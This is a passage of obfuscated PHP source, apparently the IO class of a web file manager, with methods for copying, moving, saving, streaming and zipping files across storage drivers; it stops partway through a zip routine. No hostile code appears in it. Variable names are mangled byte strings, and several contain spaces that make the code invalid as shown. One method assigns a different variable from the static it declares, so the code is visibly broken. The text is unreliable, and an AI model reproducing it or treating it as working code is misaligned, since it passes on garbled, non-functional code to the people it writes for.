self::driverMake($ÆÔš¤[0]); if (!$¹åñ¹¹ì) { return !1; } if (method_exists($¹åñ¹¹ì, $˜è×é²ù)) { $Öå ˆ½³ = @call_user_func_array(array($¹åñ¹¹ì, $˜è×é²ù), $ÆÔš¤); } else { if (method_exists($¹åñ¹¹ì, $ğİÔÄ”´[1133])) { $Öå ˆ½³ = @call_user_func_array(array($¹åñ¹¹ì, $˜è×é²ù), $ÆÔš¤); } else { if (method_exists(self, $˜è×é²ù)) { $Öå ˆ½³ = @call_user_func_array(array(self, $˜è×é²ù), $ÆÔš¤); } else { $Öå ˆ½³ = call_user_func_array(array(parent, $˜è×é²ù), $ÆÔš¤); } } } Hook::trigger($ğİÔÄ”´[1131] . $˜è×é²ù . $ğİÔÄ”´[1134], $Ûú†´“•, $Öå ˆ½³); return $Öå ˆ½³; } public static function init($”§é·ßğ) { return self::driverMake($”§é·ßğ); } public static function copy($Õ­ğøŒÓ, $ÖíÑ·¾Ÿ, $ñÂÅî³¯ = false, $ÑéûÑ¯“ = false) { return self::copyMoveStart($Õ­ğøŒÓ, $ÖíÑ·¾Ÿ, $ñÂÅî³¯, $_SERVER[® ¨Ä®ñ][540], $ÑéûÑ¯“); } public static function move($ÎÍ¿ÔŸÏ, $¾¶¿ÆÄ—, $áçÕ›¨Ü = false, $ÇïèúÆù = false) { return self::copyMoveStart($ÎÍ¿ÔŸÏ, $¾¶¿ÆÄ—, $áçÕ›¨Ü, $_SERVER[® ¨Ä®ñ][542], $ÇïèúÆù); } private static function copyMoveStart($øÃ¥şÈ, $«ïàò¬®, $äÏôàµÍ, $Ôö¡Ãƒç, $ã›†—¼) { $ª¿å¾°¨ =& $_SERVER[® ¨Ä®ñ]; $Î–„ÔŸÖ = array($øÃ¥şÈ, $«ïàò¬®, $äÏôàµÍ, $ã›†—¼); Hook::trigger($ª¿å¾°¨[1131] . $Ôö¡Ãƒç . $ª¿å¾°¨[1132], $Î–„ÔŸÖ); $Èß¤®³¢ = self::copyMove($øÃ¥şÈ, $«ïàò¬®, $äÏôàµÍ, $Ôö¡Ãƒç, $ã›†—¼); Hook::trigger($ª¿å¾°¨[1131] . $Ôö¡Ãƒç . $ª¿å¾°¨[1134], $Î–„ÔŸÖ, $Èß¤®³¢); return $Èß¤®³¢; } public static function saveFile($ÄÏõ€÷É, $¹“èÒ¾Ú, $…•ƒœ¤À = true) { $õ¨À²ÑŠ =& $_SERVER[® ¨Ä®ñ]; $¨Ñ”Ä¯· = self::info($¹“èÒ¾Ú); $ÕÙÇãùÆ = self::driverMake($ÄÏõ€÷É); $—è¼ê¿ = self::driverMake($¹“èÒ¾Ú); $Æ±ïº£Ó = !1; if ($—è¼ê¿->pathParse[$õ¨À²ÑŠ[1135]]) { $Æ±ïº£Ó = $—è¼ê¿; $ÂÅ¨Öå = $—è¼ê¿->pathParse[$õ¨À²ÑŠ[1135]]; $—è¼ê¿ = self::driverMake($ÂÅ¨Öå); } if ($ÕÙÇãùÆ->pathParse[$õ¨À²ÑŠ[1135]]) { $§Êç±ô = $ÕÙÇãùÆ->pathParse[$õ¨À²ÑŠ[1135]]; $ÕÙÇãùÆ = self::driverMake($§Êç±ô); } $ä””›èÈ = $—è¼ê¿->pathFather($¹“èÒ¾Ú); $Ë¦¼×Ãó = !0; if (!$…•ƒœ¤À && self::driverIsSame($ÕÙÇãùÆ, $—è¼ê¿)) { $Ë¦¼×Ãó = !1; } $ïì¢èš = self::copyFile($ÕÙÇãùÆ, $ÄÏõ€÷É, $—è¼ê¿, $ä””›èÈ, $¨Ñ”Ä¯·[$õ¨À²ÑŠ[32]], $Ë¦¼×Ãó); if ($Æ±ïº£Ó) { $ïì¢èš = $Æ±ïº£Ó->getPathOuter($ïì¢èš); } return $ïì¢èš; } private static function copyMove($Ó…¶ùàø, $’™˜¸Ø–, $â‡¦ãª, $Óœ†´…‰, $‹¿ÄÜ­ = false) { $Ÿ¢¾µè„ =& $_SERVER[® ¨Ä®ñ]; if (!$Ó…¶ùàø || $Ó…¶ùàø == $Ÿ¢¾µè„[8] || !$’™˜¸Ø–) { return !1; } ignore_timeout(); $ÆˆÅ„ë¹ = self::driverMake($Ó…¶ùàø); $†ĞÊ‘À = self::driverMake($’™˜¸Ø–); $±ƒùşò = $Óœ†´…‰ == $Ÿ¢¾µè„[542]; $¥”«¸ôõ = !1; if ($†ĞÊ‘À->pathParse[$Ÿ¢¾µè„[1135]]) { $¥”«¸ôõ = $†ĞÊ‘À; $’™˜¸Ø– = $†ĞÊ‘À->pathParse[$Ÿ¢¾µè„[1135]]; $†ĞÊ‘À = self::driverMake($’™˜¸Ø–); } if ($ÆˆÅ„ë¹->pathParse[$Ÿ¢¾µè„[1135]]) { $Ó…¶ùàø = $ÆˆÅ„ë¹->pathParse[$Ÿ¢¾µè„[1135]]; $ÆˆÅ„ë¹ = self::driverMake($Ó…¶ùàø); } self::check($ÆˆÅ„ë¹, $Ó…¶ùàø, $†ĞÊ‘À, $’™˜¸Ø–); Hook::trigger($Ÿ¢¾µè„[75], $ÆˆÅ„ë¹, $Ó…¶ùàø, $†ĞÊ‘À, $’™˜¸Ø–); $ŸÃ¢¶€é = self::driverIsSame($ÆˆÅ„ë¹, $†ĞÊ‘À); if ($ŸÃ¢¶€é) { if ($Óœ†´…‰ == $Ÿ¢¾µè„[542] && !method_exists($†ĞÊ‘À, $Ÿ¢¾µè„[1136]) && trim($’™˜¸Ø–, $Ÿ¢¾µè„[8]) == trim($†ĞÊ‘À->pathFather($Ó…¶ùàø), $Ÿ¢¾µè„[8])) { if ($ÆˆÅ„ë¹->pathThis($Ó…¶ùàø) != $‹¿ÄÜ­ && !$ÆˆÅ„ë¹->isTypeObject()) { return $ÆˆÅ„ë¹->rename($Ó…¶ùàø, $‹¿ÄÜ­); } return $†ĞÊ‘À->getPathOuter($Ó…¶ùàø); } if (method_exists($†ĞÊ‘À, $Óœ†´…‰)) { return $†ĞÊ‘À->{$Óœ†´…‰}($Ó…¶ùàø, $’™˜¸Ø–, $â‡¦ãª, $‹¿ÄÜ­); } } if ($ŸÃ¢¶€é && $Óœ†´…‰ == $Ÿ¢¾µè„[542] && $†ĞÊ‘À->getType() == $Ÿ¢¾µè„[107]) { $Ğ••”ë² = $†ĞÊ‘À->movePath($Ó…¶ùàø, $’™˜¸Ø–, $‹¿ÄÜ­); if ($Ğ••”ë²) { return $Ğ••”ë²; } } $è‡Ùß÷Ù = $ÆˆÅ„ë¹->isFile($Ó…¶ùàø); if (!$è‡Ùß÷Ù && $†ĞÊ‘À->getType() == $Ÿ¢¾µè„[740] && $ÆˆÅ„ë¹->getType() == $Ÿ¢¾µè„[107]) { $Ğ••”ë² = $†ĞÊ‘À->copyFolderFromIO($ÆˆÅ„ë¹, $Ó…¶ùàø, $’™˜¸Ø–, $â‡¦ãª, $±ƒùşò, $‹¿ÄÜ­); } else { $Ğ••”ë² = self::copyPath($ÆˆÅ„ë¹, $Ó…¶ùàø, $†ĞÊ‘À, $’™˜¸Ø–, $â‡¦ãª, $±ƒùşò, $è‡Ùß÷Ù, $‹¿ÄÜ­); } if ($Ğ••”ë² && $±ƒùşò) { $ÆˆÅ„ë¹->remove($Ó…¶ùàø); } if ($¥”«¸ôõ) { $Ğ••”ë² = $¥”«¸ôõ->getPathOuter($Ğ••”ë²); } return $Ğ••”ë²; } private static function check($¤ÄÇÚêŠ, $¼¼µä™ä, $Öü‡…«, &$¥şØÌ¾Ô) { $ª¾Ş¬ÑÀ =& $_SERVER[® ¨Ä®ñ]; if (self::driverIsSame($¤ÄÇÚêŠ, $Öü‡…«) && $¤ÄÇÚêŠ->isFolder($¼¼µä™ä) && $¤ÄÇÚêŠ->isParentOf($¼¼µä™ä, $¥şØÌ¾Ô)) { show_json(LNG($ª¾Ş¬ÑÀ[1137]), !1); } if (!$¤ÄÇÚêŠ->exist($¼¼µä™ä)) { show_json(LNG($ª¾Ş¬ÑÀ[106]), !1); } } private static function copyPath($°‰‚î’, $­ùíĞß„, $¦Şš ´Ë, $¶ìò‹ÑÁ, $ÆÈ„À÷§, $Ê¿¹­¾§, $ºòùÑ¶, $ÍÜËÛûØ = false) { $ğß£™º¬ =& $_SERVER[® ¨Ä®ñ]; $›Ÿ‰Ğİ = empty($ÍÜËÛûØ) && $ÍÜËÛûØ !== $ğß£™º¬[190] ? $°‰‚î’->pathThis($­ùíĞß„) : $ÍÜËÛûØ; if ($ÆÈ„À÷§) { $ÔÉŒá˜ä = $¦Şš ´Ë->fileNameExist($¶ìò‹ÑÁ, $›Ÿ‰Ğİ); $›Ÿ‰Ğİ = $¦Şš ´Ë->fileNameAuto($¶ìò‹ÑÁ, $›Ÿ‰Ğİ, $ÆÈ„À÷§, !$ºòùÑ¶); $ÆÈ„À÷§ = $ÔÉŒá˜ä ? $ÆÈ„À÷§ : !1; } if ($ºòùÑ¶) { return self::copyFile($°‰‚î’, $­ùíĞß„, $¦Şš ´Ë, $¶ìò‹ÑÁ, $›Ÿ‰Ğİ, $Ê¿¹­¾§); } if ($ÆÈ„À÷§ == REPEAT_RENAME_FOLDER) { $ÆÈ„À÷§ = !1; } $ÖœõÆŞË = rtrim($¶ìò‹ÑÁ, $ğß£™º¬[8]) . $ğß£™º¬[8] . $›Ÿ‰Ğİ; $š«¯¨À¸ = $¦Şš ´Ë->mkdir($¦Şš ´Ë->getPath($ÖœõÆŞË)); $¶ìò‹ÑÁ = $¦Şš ´Ë->getPathInner($š«¯¨À¸); $ÀÍá¸ßÏ = $°‰‚î’->listPath($­ùíĞß„, !0); $ÀÍá¸ßÏ = is_array($ÀÍá¸ßÏ) ? $ÀÍá¸ßÏ : array($ğß£™º¬[76] => array(), $ğß£™º¬[77] => array()); $³ÊÈíƒ‡ = array_merge($ÀÍá¸ßÏ[$ğß£™º¬[76]], $ÀÍá¸ßÏ[$ğß£™º¬[77]]); foreach ($³ÊÈíƒ‡ as $ÇÃŠ®»Æ) { $Ğğò’Î = $ÇÃŠ®»Æ[$ğß£™º¬[33]] == $ğß£™º¬[192]; $­ùíĞß„ = $°‰‚î’->getPathInner($ÇÃŠ®»Æ[$ğß£™º¬[78]]); $¡Üá»ëÀ = self::copyPath($°‰‚î’, $­ùíĞß„, $¦Şš ´Ë, $¶ìò‹ÑÁ, $ÆÈ„À÷§, $Ê¿¹­¾§, $Ğğò’Î); if (!$¡Üá»ëÀ) { IO::errorTips($ğß£™º¬[1138] . $­ùíĞß„ . $ğß£™º¬[70] . $¶ìò‹ÑÁ); } } self::copyMoveKeepInfo($°‰‚î’, $­ùíĞß„, $š«¯¨À¸); return $š«¯¨À¸; } private static function copyFile($ÃÈ§Æº¹, $ƒæİŞâ, $äÔÅ˜µô, $şîÃı, $ğˆ±Â‚«, $¸“À²Ó¥) { $ÏÎüç¯ =& $_SERVER[® ¨Ä®ñ]; $şîÃı = $äÔÅ˜µô->getPath(rtrim($şîÃı, $ÏÎüç¯[8]) . $ÏÎüç¯[8] . $ğˆ±Â‚«); $¹ÊÌÜ¨ì = $ÏÎüç¯[1139] . time() . rand_string(5); Hook::trigger($ÏÎüç¯[1140], $ÃÈ§Æº¹, $ƒæİŞâ, $äÔÅ˜µô, $şîÃı, $ğˆ±Â‚«, $¹ÊÌÜ¨ì); if (self::driverIsSame($ÃÈ§Æº¹, $äÔÅ˜µô)) { if ($¸“À²Ó¥) { $ºè“ğ¶Ï = $äÔÅ˜µô->moveFile($ƒæİŞâ, $şîÃı); } else { $ºè“ğ¶Ï = $äÔÅ˜µô->copyFile($ƒæİŞâ, $şîÃı); } Hook::trigger($ÏÎüç¯[1141], $ÃÈ§Æº¹, $ƒæİŞâ, $äÔÅ˜µô, $şîÃı, $ğˆ±Â‚«, $ºè“ğ¶Ï); self::copyMoveKeepInfo($ÃÈ§Æº¹, $ƒæİŞâ, $ºè“ğ¶Ï); return $ºè“ğ¶Ï; } $ıóˆşâİ = TEMP_FILES; if ($GLOBALS[$ÏÎüç¯[6]][$ÏÎüç¯[90]][$ÏÎüç¯[778]]) { $ıóˆşâİ = $GLOBALS[$ÏÎüç¯[6]][$ÏÎüç¯[90]][$ÏÎüç¯[778]]; } $óÌÍÀÍ˜ = $ıóˆşâİ; mk_dir($óÌÍÀÍ˜); $ó¿£¼Ãİ = $óÌÍÀÍ˜ . $¹ÊÌÜ¨ì; $±õóÙ˜€ = $ó¿£¼Ãİ; $ó¿£¼Ãİ = $ÃÈ§Æº¹->download($ƒæİŞâ, $ó¿£¼Ãİ); $ó¿£¼Ãİ = $ÃÈ§Æº¹->iconvApp($ó¿£¼Ãİ); if (substr($ó¿£¼Ãİ, strlen($ıóˆşâİ)) == $ıóˆşâİ) { $¸“À²Ó¥ = !0; } $ºè“ğ¶Ï = $äÔÅ˜µô->upload($şîÃı, $ó¿£¼Ãİ, $¸“À²Ó¥); self::remove($±õóÙ˜€); Hook::trigger($ÏÎüç¯[1141], $ÃÈ§Æº¹, $ƒæİŞâ, $äÔÅ˜µô, $şîÃı, $ğˆ±Â‚«, $ºè“ğ¶Ï); self::copyMoveKeepInfo($ÃÈ§Æº¹, $ƒæİŞâ, $ºè“ğ¶Ï); return $ºè“ğ¶Ï; } private static function copyMoveKeepInfo($î±˜õã, $À€¡°ñœ, $ì³ŒØİË) { if (!$ì³ŒØİË) { return; } $äç÷›ü× = $î±˜õã->info($À€¡°ñœ); if (!is_array($äç÷›ü×)) { return; } IO::setModifyTime($ì³ŒØİË, $äç÷›ü×[$_SERVER[® ¨Ä®ñ][86]]); } public static function pathFather($Ş€ôèÁ‰) { $Ñ¼“øÑœ = IO::init($Ş€ôèÁ‰); $Ôøî˜÷ = $Ñ¼“øÑœ->pathFather($Ñ¼“øÑœ->path); return $Ñ¼“øÑœ->getPathOuter($Ôøî˜÷); } public static function fileOut($íüõ¿Ñá, $Àí¾•·¾ = false, $ì÷¹¢¹º = false, $à¤ÁÛ•Û = '') { $ÂÒ‰Ø×š = self::driverMake($íüõ¿Ñá); if ($ÂÒ‰Ø×š->isFileOutServer()) { return $ÂÒ‰Ø×š->fileOutServer($íüõ¿Ñá, $Àí¾•·¾, $ì÷¹¢¹º, $à¤ÁÛ•Û); } return $ÂÒ‰Ø×š->fileOut($íüõ¿Ñá, $Àí¾•·¾, $ì÷¹¢¹º, $à¤ÁÛ•Û); } public static function fileOutImage($Ğ™éãŸÎ, $¿Çë…Ï© = 250) { $áöÜš©÷ = array(250, 600, 1200, 2000, 3000, 5000); for ($…‡ç±Ğ‘ = 0; $…‡ç±Ğ‘ < count($áöÜš©÷); $…‡ç±Ğ‘++) { if ($…‡ç±Ğ‘ == 0 && $¿Çë…Ï© <= $áöÜš©÷[$…‡ç±Ğ‘]) { $¿Çë…Ï© = $áöÜš©÷[$…‡ç±Ğ‘]; break; } else { if ($¿Çë…Ï© > $áöÜš©÷[$…‡ç±Ğ‘ - 1] && $¿Çë…Ï© <= $áöÜš©÷[$…‡ç±Ğ‘]) { $¿Çë…Ï© = $áöÜš©÷[$…‡ç±Ğ‘]; break; } else { if ($…‡ç±Ğ‘ == count($áöÜš©÷) - 1 && $¿Çë…Ï© > $áöÜš©÷[$…‡ç±Ğ‘]) { $¿Çë…Ï© = $áöÜš©÷[$…‡ç±Ğ‘]; break; } } } } $ŞÚ£òÔ = self::driverMake($Ğ™éãŸÎ); if ($ŞÚ£òÔ->isFileOutServer()) { return $ŞÚ£òÔ->fileOutImageServer($Ğ™éãŸÎ, $¿Çë…Ï©); } return $ŞÚ£òÔ->fileOutImage($Ğ™éãŸÎ, $¿Çë…Ï©); } private static function driverIsSame($ÛĞƒíÕ, $¼ÖÜ®ƒ) { $ŒĞëß©Ó =& $_SERVER[® ¨Ä®ñ]; $Çªƒ¦÷‘ = $ÛĞƒíÕ->getType(); $¹ÛÉÅŠ = $¼ÖÜ®ƒ->getType(); if ($Çªƒ¦÷‘ != $¹ÛÉÅŠ) { return !1; } if ($Çªƒ¦÷‘ == $ŒĞëß©Ó[740]) { return !0; } if ($Çªƒ¦÷‘ == $ŒĞëß©Ó[107]) { return !0; } if ($ÛĞƒíÕ->pathDriver == $¼ÖÜ®ƒ->pathDriver) { return !0; } return !1; } public static function copyUpdate($äúÒØœ, $ŠóŞÁá) { $Ê‰îŞÁ± =& $_SERVER[® ¨Ä®ñ]; if (!IO::exist($äúÒØœ)) { return !1; } if (!IO::exist($ŠóŞÁá)) { IO::mkdir($ŠóŞÁá); } $Ã÷„öÙ¾ = self::_listAll($äúÒØœ); $­Î…Œœ = self::_listAll($ŠóŞÁá); $¹¨íÛ½ = array(); $ı¥‰ØüÔ = array(); foreach ($Ã÷„öÙ¾ as $ƒç·ëÑÒ => $Øåöêèó) { if (isset($­Î…Œœ[$ƒç·ëÑÒ])) { if ($Øåöêèó[$Ê‰îŞÁ±[79]] == 1) { continue; } if ($­Î…Œœ[$ƒç·ëÑÒ][$Ê‰îŞÁ±[80]] == $Øåöêèó[$Ê‰îŞÁ±[80]]) { continue; } } if ($Øåöêèó[$Ê‰îŞÁ±[79]] == 1) { $ı¥‰ØüÔ[] = $ŠóŞÁá . $Ê‰îŞÁ±[8] . $ƒç·ëÑÒ; continue; } $‘“½…ùÇ = strstr(trim($ƒç·ëÑÒ, $Ê‰îŞÁ±[8]), $Ê‰îŞÁ±[8]) ? get_path_father($ƒç·ëÑÒ) : $Ê‰îŞÁ±[12]; $¹¨íÛ½[] = array($Ê‰îŞÁ±[1142] => $Øåöêèó[$Ê‰îŞÁ±[78]], $Ê‰îŞÁ±[1143] => rtrim($ŠóŞÁá, $Ê‰îŞÁ±[8]) . $Ê‰îŞÁ±[8] . $‘“½…ùÇ, $Ê‰îŞÁ±[1144] => $Øåöêèó); } $†© âİ = array($Ê‰îŞÁ±[192] => $¹¨íÛ½, $Ê‰îŞÁ±[79] => $ı¥‰ØüÔ); Hook::trigger($Ê‰îŞÁ±[1145], $äúÒØœ, $ŠóŞÁá, $†© âİ); foreach ($ı¥‰ØüÔ as $Øåöêèó) { IO::mkdir($Øåöêèó); } foreach ($¹¨íÛ½ as $Øåöêèó) { IO::copy($Øåöêèó[$Ê‰îŞÁ±[1142]], $Øåöêèó[$Ê‰îŞÁ±[1143]], REPEAT_REPLACE); } } private static function _listAll($Ğ´Û²À») { $ƒç¤Õå£ =& $_SERVER[® ¨Ä®ñ]; $Ğ´Û²À» = KodIO::clear($Ğ´Û²À»); $Îã•«ª— = IO::listAll($Ğ´Û²À»); foreach ($Îã•«ª— as &$ì¤ôÏü) { $†«ğœÔ€ = substr($ì¤ôÏü[$ƒç¤Õå£[78]], strlen($Ğ´Û²À»)); $ì¤ôÏü[$ƒç¤Õå£[1146]] = trim($†«ğœÔ€, $ƒç¤Õå£[8]); } unset($ì¤ôÏü); return array_to_keyvalue($Îã•«ª—, $ƒç¤Õå£[1146]); } public static function fileSubstr($­ò“àòë, $ÔÇ³‡¶å, $®—¡ïù = false) { $ë­”ˆ¨ =& $_SERVER[® ¨Ä®ñ]; $º‹ğÀ€ = self::driverMake($­ò“àòë); $Ã»šñ¡¨ = $º‹ğÀ€->size($­ò“àòë); $„÷íéÒ = $ÔÇ³‡¶å; $œÛÛ€Ô = $®—¡ïù; if ($ÔÇ³‡¶å < 0) { $ÔÇ³‡¶å = $Ã»šñ¡¨ + $ÔÇ³‡¶å; } if ($®—¡ïù === !1) { $®—¡ïù = $Ã»šñ¡¨ - $ÔÇ³‡¶å; } if ($ÔÇ³‡¶å + $®—¡ïù > $Ã»šñ¡¨) { $®—¡ïù = $Ã»šñ¡¨ - $ÔÇ³‡¶å; } if (!$Ã»šñ¡¨ && $º‹ğÀ€->getType() == $ë­”ˆ¨[107] && !$º‹ğÀ€->exist($­ò“àòë)) { throw new Exception($ë­”ˆ¨[1147] . LNG($ë­”ˆ¨[1148]) . $ë­”ˆ¨[950] . get_path_this($­ò“àòë) . $ë­”ˆ¨[12]); } if ($®—¡ïù <= 0) { return $ë­”ˆ¨[12]; } if ($ÔÇ³‡¶å < 0 || $ÔÇ³‡¶å >= $Ã»šñ¡¨ || $®—¡ïù > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\145\x52\x65\x61\x64\x20\145\162\162\157\162\x21\x20\163\164\x61\162\164\x3d{$ÔÇ³‡¶å}\73\x6c\x65\156\147\164\x68\x3d{$®—¡ïù}\73\x20\x73\151\172\145\75{$Ã»šñ¡¨}\73"); } $¶ò³è™ = $º‹ğÀ€->fileSubstr($­ò“àòë, $ÔÇ³‡¶å, $®—¡ïù); if (!$¶ò³è™ && $®—¡ïù && isset($GLOBALS[$ë­”ˆ¨[1149]])) { throw new Exception($GLOBALS[$ë­”ˆ¨[1149]][$ë­”ˆ¨[1150]]); } return $¶ò³è™; } private static function driverMake(&$«á’Æ×ë) { $õŒÍö®‘ =& $_SERVER[® ¨Ä®ñ]; $¼Ë¿Ö¯— = KodIO::parse($«á’Æ×ë); if (!self::$driverListSystem) { $² Çß©š = Model($õŒÍö®‘[749])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($² Çß©š, $õŒÍö®‘[392]); } if ($¼Ë¿Ö¯—[$õŒÍö®‘[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¼Ë¿Ö¯—[$õŒÍö®‘[392]]]) { return !1; } $«á’Æ×ë = $¼Ë¿Ö¯—[$õŒÍö®‘[1151]]; $ù÷ŒÔòƒ = self::driverGet($¼Ë¿Ö¯—, $«á’Æ×ë); return $ù÷ŒÔòƒ; } private static function driverGet($“â¬Øµ, &$úó’ÎÛˆ) { $Ô™»å‚† =& $_SERVER[® ¨Ä®ñ]; $Á¯ç¯ğÚ = $“â¬Øµ[$Ô™»å‚†[1152]]; $œ³õÏ = $“â¬Øµ[$Ô™»å‚†[392]]; switch ($“â¬Øµ[$Ô™»å‚†[33]]) { case KodIO::KOD_IO: $âçÖÂ«Ğ = self::$driverListSystem[$œ³õÏ]; break; case KodIO::KOD_SOURCE: $úó’ÎÛˆ = $œ³õÏ . $úó’ÎÛˆ; $âçÖÂ«Ğ = array($Ô™»å‚†[1153] => $Ô™»å‚†[1154], $Ô™»å‚†[6] => $“â¬Øµ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Èª²àÆ§ = $GLOBALS[$Ô™»å‚†[1155]]; self::$driverListUser = array_to_keyvalue($Èª²àÆ§, $Ô™»å‚†[392]); } $âçÖÂ«Ğ = self::$driverListUser[$œ³õÏ]; break; case KodIO::KOD_SHARE_LINK: $âçÖÂ«Ğ = array($Ô™»å‚†[1153] => $Ô™»å‚†[1156], $Ô™»å‚†[6] => $“â¬Øµ); $¬€×ÌíÇ = Action($Ô™»å‚†[1157])->sharePathInfo($“â¬Øµ[$Ô™»å‚†[78]]); $úó’ÎÛˆ = $¬€×ÌíÇ[$Ô™»å‚†[394]]; if (!$¬€×ÌíÇ[$Ô™»å‚†[394]]) { $‚æ€”ñ = Model($Ô™»å‚†[586])->getInfo($¬€×ÌíÇ[$Ô™»å‚†[479]]); $úó’ÎÛˆ = KodIO::clear($‚æ€”ñ[$Ô™»å‚†[1158]] . $“â¬Øµ[$Ô™»å‚†[1151]]); $“â¬Øµ[$Ô™»å‚†[477]] = $‚æ€”ñ; $“â¬Øµ[$Ô™»å‚†[1135]] = $úó’ÎÛˆ; $âçÖÂ«Ğ = array($Ô™»å‚†[1153] => $Ô™»å‚†[1159], $Ô™»å‚†[6] => $“â¬Øµ); } break; case KodIO::KOD_SHARE_ITEM: $âçÖÂ«Ğ = array($Ô™»å‚†[1153] => $Ô™»å‚†[1160], $Ô™»å‚†[6] => $“â¬Øµ); $‚æ€”ñ = Model($Ô™»å‚†[586])->getInfo($“â¬Øµ[$Ô™»å‚†[392]]); if ($‚æ€”ñ[$Ô™»å‚†[394]] == $Ô™»å‚†[190]) { $úó’ÎÛˆ = KodIO::clear($‚æ€”ñ[$Ô™»å‚†[1158]] . $“â¬Øµ[$Ô™»å‚†[1151]]); $“â¬Øµ[$Ô™»å‚†[477]] = $‚æ€”ñ; $“â¬Øµ[$Ô™»å‚†[1135]] = $úó’ÎÛˆ; $âçÖÂ«Ğ = array($Ô™»å‚†[1153] => $Ô™»å‚†[1161], $Ô™»å‚†[6] => $“â¬Øµ); } else { if (!$úó’ÎÛˆ) { $úó’ÎÛˆ = $‚æ€”ñ[$Ô™»å‚†[394]]; } } break; default: $úó’ÎÛˆ = $“â¬Øµ[$Ô™»å‚†[78]]; $âçÖÂ«Ğ = array($Ô™»å‚†[1153] => $Ô™»å‚†[1162]); break; } $‡¬İÖôÀ = $“â¬Øµ[$Ô™»å‚†[78]]; if (!isset(self::$driverCache[$‡¬İÖôÀ])) { $Ú€±‡³¢ = strtolower($âçÖÂ«Ğ[$Ô™»å‚†[96]]); $ÒèõäŒ® = $GLOBALS[$Ô™»å‚†[6]][$Ô™»å‚†[90]][$Ô™»å‚†[808]]; $Í™ ‹ƒ± = $Ô™»å‚†[74] . (isset($ÒèõäŒ®[$Ú€±‡³¢]) ? $ÒèõäŒ®[$Ú€±‡³¢] : ucfirst($Ú€±‡³¢)); if (!class_exists($Í™ ‹ƒ±)) { show_json("{$Í™ ‹ƒ±}\x20\156\157\x74\x20\145\170\151\x73\164\163\41", !1); } $ÃçË×« = isset($âçÖÂ«Ğ[$Ô™»å‚†[6]]) ? $âçÖÂ«Ğ[$Ô™»å‚†[6]] : !1; self::$driverCache[$‡¬İÖôÀ] = new $Í™ ‹ƒ±($ÃçË×«); } $ã¹ÙŞ = self::$driverCache[$‡¬İÖôÀ]; $ã¹ÙŞ->pathDriver = $Á¯ç¯ğÚ; $ã¹ÙŞ->pathBase = $Ô™»å‚†[12]; if (isset($âçÖÂ«Ğ[$Ô™»å‚†[6]][$Ô™»å‚†[1163]])) { $ã¹ÙŞ->pathBase = rtrim($âçÖÂ«Ğ[$Ô™»å‚†[6]][$Ô™»å‚†[1163]], $Ô™»å‚†[8]) . $Ô™»å‚†[8]; $úó’ÎÛˆ = $ã¹ÙŞ->pathBase . ltrim($úó’ÎÛˆ, $Ô™»å‚†[8]); } $úó’ÎÛˆ = $ã¹ÙŞ->getPath($úó’ÎÛˆ); if (isset($“â¬Øµ[$Ô™»å‚†[1135]])) { $úó’ÎÛˆ = $“â¬Øµ[$Ô™»å‚†[1135]]; } $ã¹ÙŞ->path = $úó’ÎÛˆ; return $ã¹ÙŞ; } public static function errorTips($¡à…‡®ì = false) { $Ş¶‚ÛÉï =& $_SERVER[® ¨Ä®ñ]; static $İå í = array(); $ÕŠç•í = 1000; if ($¡à…‡®ì === -1) { return $İå í ? $İå í[count($İå í) - 1] : $Ş¶‚ÛÉï[12]; } if ($¡à…‡®ì === !1) { return implode($Ş¶‚ÛÉï[226], $İå í); } if (count($İå í) >= $ÕŠç•í) { $İå í = array_slice($İå í, $ÕŠç•í * 0.5, $ÕŠç•í); } $İå í[] = $¡à…‡®ì; write_log($Ş¶‚ÛÉï[159] . ACTION . $Ş¶‚ÛÉï[1164] . $¡à…‡®ì, $Ş¶‚ÛÉï[1165]); } public static function getLastError($ÉíİÈå¥ = '') { $çß´•¸ = self::errorTips(-1); return $çß´•¸ ? $çß´•¸ : $ÉíİÈå¥; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¶Ü¢ÀÇ‹; if (!$¶Ü¢ÀÇ‹) { $¹Çïç¶ç = IO::init($_SERVER[® ¨Ä®ñ][8]); } return $¹Çïç¶ç; } private static function iconvSystem($Õ§˜Ò†) { return self::local()->iconvSystem($Õ§˜Ò†); } private static function iconvApp($„Ø³åÇØ) { return self::local()->iconvApp($„Ø³åÇØ); } public static function zip($˜ÊØòÓ, $ä¸­µ™Ö = "\172\x69\160", $Ö¬–à = '', $‡¨¹ıåÆ = REPEAT_RENAME) { $â¢÷È¯ =& $_SERVER[® ¨Ä®ñ]; $‹‹”Š•ƒ = self::init($˜ÊØòÓ[0][$â¢÷È¯[78]]); $ÓçÑ³è = self::info($˜ÊØòÓ[0][$â¢÷È¯[78]]); $ÚòÁ†± = !1; if (!$Ö¬–à && $‹‹”Š•ƒ->getType() == $â¢÷È¯[107]) { $´ºÁÀŞ¥ = self::zipFileList($˜ÊØòÓ); } else { $ÚòÁ†± = $Ö¬–à ? $Ö¬–à : TEMP_FILES . $â¢÷È¯[1166] . time() . rand_string(8) . $â¢÷È¯[8]; mk_dir($ÚòÁ†±); $´ºÁÀŞ¥ = self::zipFileList($˜ÊØòÓ, $ÚòÁ†±); } $êïù°Ñ¯ = $ÓçÑ³è[$â¢÷È¯[32]]; if (count($´ºÁÀŞ¥) > 1) { $Í¥©™¸ = IO::info(IO::pathFather($ÓçÑ³è[$â¢÷È¯[78]])); $êïù°Ñ¯ = $Í¥©™¸[$â¢÷È¯[32]]; } $ìõÒ¤ö = $ÚòÁ†±; if (!$ìõÒ¤ö) { $ìõÒ¤ö = get_path_father($ÓçÑ³è[$â¢÷È¯[78]]); if (!$Ö¬–à && $‹‹”Š•ƒ->getType() == $â¢÷È¯[107]) { $ìõÒ¤ö = get_path_father($‹‹”Š•ƒ->path); } $ÀÂ‚ø°Ò = IO::info($ìõÒ¤ö); if (!$ÀÂ‚ø°Ò[$â¢÷È¯[195]]) { show_json(LNG($â¢÷È¯[1167]), !1); } } $›µ›²ƒŠ = $ìõÒ¤ö . $êïù°Ñ¯ . $â¢÷È¯[10] . $ä¸­µ™Ö; $›µ›²ƒŠ = get_filename_auto($›µ›²ƒŠ, $â¢÷È¯[12], $‡¨¹ıåÆ); $£éòÄ½­ = self::iconvSystem($›µ›²ƒŠ); foreach ($´ºÁÀŞ¥ as $ğš¡«ë => $§¬Ÿ‡Ìµ) { $´ºÁÀŞ¥[$ğš¡«ë] = self::iconvSystem($§¬Ÿ‡Ìµ); } KodArchive::create($£éòÄ½­, 